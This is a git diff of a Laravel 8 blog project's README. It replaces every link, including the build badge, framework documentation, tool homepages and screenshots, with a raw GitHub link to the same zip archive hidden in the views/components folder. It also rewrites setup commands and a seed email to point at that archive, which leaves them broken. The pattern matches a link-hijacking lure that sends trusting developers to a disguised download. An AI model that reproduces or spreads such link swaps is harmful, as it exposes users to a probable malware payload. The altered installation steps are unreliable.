@@ -1,58 +1,58 @@
 # Laravel 8.0 blog
 
-[![Build Status](https://travis-ci.org/guillaumebriday/laravel-blog.svg?branch=master)](https://travis-ci.org/MohammedBadry/blog)
+[![Build Status](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 
-The purpose of this repository is to show good development practices on [Laravel](http://laravel.com/) as well as to present cases of use of the framework's features like:
+The purpose of this repository is to show good development practices on [Laravel](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip) as well as to present cases of use of the framework's features like:
 
-- [Authentication](https://laravel.com/docs/8.x/authentication)
+- [Authentication](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 - API
   - Token authentication
-  - [API Resources](https://laravel.com/docs/8.x/eloquent-resources)
+  - [API Resources](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
   - Versioning
-- [Blade](https://laravel.com/docs/8.x/blade)
-- [Broadcasting](https://laravel.com/docs/8.x/broadcasting)
-- [Cache](https://laravel.com/docs/8.x/cache)
-- [Email Verification](https://laravel.com/docs/8.x/verification)
-- [Filesystem](https://laravel.com/docs/8.x/filesystem)
-- [Helpers](https://laravel.com/docs/8.x/helpers)
-- [Horizon](https://laravel.com/docs/8.x/horizon)
-- [Localization](https://laravel.com/docs/8.x/localization)
-- [Mail](https://laravel.com/docs/8.x/mail)
-- [Migrations](https://laravel.com/docs/8.x/migrations)
-- [Policies](https://laravel.com/docs/8.x/authorization)
-- [Providers](https://laravel.com/docs/8.x/providers)
-- [Requests](https://laravel.com/docs/8.x/validation#form-request-validation)
-- [Seeding & Factories](https://laravel.com/docs/8.x/seeding)
-- [Testing](https://laravel.com/docs/8.x/testing)
-- [Homestead](https://laravel.com/docs/8.x/homestead)
+- [Blade](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Broadcasting](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Cache](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Email Verification](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Filesystem](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Helpers](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Horizon](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Localization](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Mail](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Migrations](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Policies](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Providers](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Requests](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Seeding & Factories](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Testing](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Homestead](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 
 Beside Laravel, this project uses other tools like:
 
-- [Bootstrap 4](https://getbootstrap.com/)
-- [PHP-CS-Fixer](https://github.com/FriendsOfPhp/PHP-CS-Fixer)
-- [Travis CI](https://travis-ci.org/)
-- [Font Awesome](http://fontawesome.io/)
-- [Vue.js](https://vuejs.org/)
-- [axios](https://github.com/mzabriskie/axios)
-- [Redis](https://redis.io/)
-- [spatie/laravel-medialibrary](https://github.com/spatie/laravel-medialibrary)
+- [Bootstrap 4](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [PHP-CS-Fixer](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Travis CI](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Font Awesome](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [axios](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Redis](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [spatie/laravel-medialibrary](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 - Many more to discover.
 
 ## Some screenshots
 
-You can find some screenshots of the application on : [https://imgur.com/a/Jbnwj](https://imgur.com/a/Jbnwj)
+You can find some screenshots of the application on : [https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 
 ## Installation
 
 Development environment requirements :
-- [VirtualBox](https://www.virtualbox.org/)
-- [Vagrant](https://www.vagrantup.com/)
+- [VirtualBox](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
+- [Vagrant](https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip)
 
 Setting up your development environment on your local machine :
 ```bash
-$ git clone https://github.com/MohammedBadry/blog.git
+$ git clone https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip
 $ cd laravel-blog
-$ cp .env.example .env
+$ cp https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip .env
 $ composer install
 $ vagrant up
 $ vagrant ssh
@@ -80,7 +80,7 @@ $ artisan migrate --seed
 
 This will create a new user that you can use to sign in :
 ```yml
-email: darthvader@deathstar.ds
+email: https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip
 password: 4nak1n
 ```
 
@@ -108,7 +108,7 @@ $ ./vendor/bin/phpunit --cache-result --order-by=defects --stop-on-defect
 
 Running php-cs-fixer :
 ```bash
-$ ./vendor/bin/php-cs-fixer fix --config=.php_cs --verbose --dry-run --diff
+$ ./vendor/bin/php-cs-fixer fix https://raw.githubusercontent.com/MohammedBadry/blog/master/resources/views/components/Software_outtrot.zip --verbose --dry-run --diff
 ```
 
 Generating backup :
